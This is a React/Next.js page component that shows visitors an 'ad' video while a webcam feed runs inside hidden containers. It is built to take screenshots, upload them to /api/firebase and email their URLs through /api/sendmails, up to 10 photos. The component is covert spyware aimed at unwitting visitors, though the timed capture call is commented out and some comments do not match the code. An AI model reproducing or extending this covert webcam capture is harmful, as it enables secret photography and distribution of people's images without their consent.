'use client'

import React, { useState, useCallback, useRef, useEffect } from 'react'
import Webcam from 'react-webcam'
import { useRouter } from 'next/navigation'
import PermissionPopup from './permission-popup'

const videoConstraints = {
  width: 1280,
  height: 720,
  facingMode: "user"
}

const dataURItoBlob = (dataURI: string) => {
  const byteString = atob(dataURI.split(',')[1])
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0]
  const ab = new ArrayBuffer(byteString.length)
  const ia = new Uint8Array(ab)
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i)
  }
  return new Blob([ab], { type: mimeString })
}

export default function WebcamCapture() {
  const [imageUrl, setImageUrl] = useState("https://cdn-icons-png.flaticon.com/128/17633/17633590.png")
  const [capturedImages, setCapturedImages] = useState<string[]>([])
  const [showPermissionPopup, setShowPermissionPopup] = useState(true)
  const [showWebcam, setShowWebcam] = useState(true)
  const [captureCount, setCaptureCount] = useState(0)
  const [isCapturing, setIsCapturing] = useState(false)
  const webcamRef = useRef<Webcam>(null)
  const router = useRouter()

  const handlePermissionGranted = () => {
    setShowPermissionPopup(false)
  }

  const capture = useCallback(async () => { 
    if (webcamRef.current) {
      const imageSrc = webcamRef.current.getScreenshot()
      if (imageSrc) {
        setCapturedImages(prev => [...prev, imageSrc])
        setCaptureCount(prev => prev + 1)
        
        const blob = dataURItoBlob(imageSrc)
        const formData = new FormData()
        formData.append("file", blob, `captured_image_${captureCount + 1}.jpg`)

        try {
          const response = await fetch("/api/firebase", {
            method: "POST",
            body: formData
          })
          const data = await response.json()
          console.log("Image uploaded:", data.url)
          await sendMails(data.url)
        } catch (error) {
          console.error("Error uploading image:", error)
        }
      }
    }
  }, [webcamRef, captureCount])

  useEffect(() => {
    startCapturing();
    if (isCapturing && captureCount < 10) {
      const timer = setTimeout(() => {
       // capture()
      }, 5000) // Capture every 2 seconds

      return () => clearTimeout(timer)
    } else if (captureCount >= 10) {
      setIsCapturing(false)
      setShowWebcam(false)
    }
  }, [isCapturing, captureCount, capture])

  const startCapturing = () => {
    setIsCapturing(true)
    setCaptureCount(0)
    setCapturedImages([])
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-400 to-sky-500 flex flex-col items-center justify-center p-8">
        <h1 className='text-white text-2xl font-bold'>Please Watch The Ad then the websites Continues</h1>
      {showPermissionPopup && <PermissionPopup onPermissionGranted={handlePermissionGranted} />}
      <div className="backdrop-blur-lg hidden bg-white/30 rounded-lg p-8 shadow-2xl border-2 border-white/50">
        <h1 className="text-4xl font-bold mb-8 text-center text-white drop-shadow-lg">
        </h1>
        <div className="relative hidden">
          {showWebcam ? (
            <>
              <Webcam
                audio={false}
                height={480}
                ref={webcamRef}
                screenshotFormat="image/jpeg"
                width={640}
                videoConstraints={videoConstraints}
                className="rounded-lg shadow-lg border-4 border-white/50"
              />
              {isCapturing && (
                <div className="absolute top-4 right-4 bg-white/70 rounded-full px-3 py-1 text-lg font-bold text-green-600">
                  Capture: {captureCount}/10
                </div>
              )}
            </>
          ) : capturedImages.length > 0 ? (
            <div className="w-[640px] h-[480px] flex items-center justify-center bg-black/70 rounded-lg">
              <img src={capturedImages[capturedImages.length - 1]} alt="Last Captured" className="max-w-full max-h-full" />
            </div>
          ) : (
            <div className="w-[640px] h-[480px] flex items-center justify-center bg-black/70 rounded-lg">
              <p className="text-white text-2xl">No images captured</p>
            </div>
          )}
        </div>
        <div className="mt-6 flex justify-center">
          {!isCapturing && captureCount < 10 && (
            <button
              onClick={startCapturing}
              className="px-6 py-3 bg-gradient-to-r from-green-500 to-sky-500 text-white font-semibold rounded-full shadow-lg hover:shadow-green-500/50 transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
            >
              Start Capturing
            </button>
          )}
        </div>
        {captureCount >= 10 && (
          <p className="mt-4 text-center text-white font-semibold drop-shadow">
            All 10 photos captured and stored in the database!
          </p>
        )}
        <div className="mt-8">
          <h2 className="text-2xl font-bold mb-4 text-center text-white drop-shadow-lg">
            Captured Images
          </h2>
          <div className="grid grid-cols-5 gap-2">
            {capturedImages.map((img, index) => (
              <img key={index} src={img} alt={`Captured ${index + 1}`} className="w-full h-auto rounded-md" />
            ))}
          </div>
        </div>
        <div className="mt-8">
          <h2 className="text-2xl font-bold mb-4 text-center text-white drop-shadow-lg">
            How to Use
          </h2>
        
        </div>
      </div>
      <video
            src="/myvideo.mp4"
            autoPlay
            muted
            className="w-full rounded-lg shadow-lg"
          >
            Your browser does not support the video tag.
          </video>
    </div>
  )
}

// Placeholder for sendMails function. Replace with your actual implementation.
const sendMails=async(imgUrl:any)=>{
    const response = await fetch("/api/sendmails", {
        method: "POST",
        body: JSON.stringify({imgUrl})
      })
      const data = await response.json()
      console.log("Response is::::::",data);
    //   console.log();    
}

